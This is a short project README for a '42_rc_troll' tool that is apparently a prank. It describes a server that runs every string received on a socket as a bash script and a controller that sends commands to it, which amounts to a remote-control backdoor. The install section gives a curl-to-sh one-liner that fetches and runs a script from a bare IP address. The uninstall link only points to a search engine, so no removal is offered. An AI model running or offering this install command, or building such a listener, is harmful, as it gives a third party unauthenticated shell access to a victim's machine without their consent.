# 42\_rc\_troll
Remote control troll via sockets

# Disclaimer

I am in no way responsible for the potential uses of this project, no matter if the user is myself or a third party.

# How it works (basic)

The `troll_server` binary creates a server via Unix sockets and listen to `TROLL_PORT`. Everything read from this socket is ran as a shell script (a new bash process is born each time. Those are for now ran asynchronously).

The `troll_controller` connects to a particular server and sends strings to the server. Some builtin commands are integrated. It also listen for output by the sever.

# How to install (something you shouldn’t do)

To install the troll, run `curl http://51.255.193.81/mlforall/42/troll/pool/rc/tinstall.sh | sh`

# How to uninstall

Well, just follow this [link](https://google.fr)
